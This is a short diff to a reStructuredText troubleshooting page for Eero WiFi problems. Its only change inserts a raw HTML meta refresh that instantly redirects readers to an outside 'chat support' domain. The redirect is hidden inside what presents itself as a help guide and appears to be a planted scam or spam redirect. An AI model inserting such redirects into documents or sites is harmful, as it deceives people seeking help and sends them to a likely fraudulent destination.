@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
+
+ 
 Fix Eero WiFi Not Working | Quick Troubleshooting Guide
 ==========================================
 
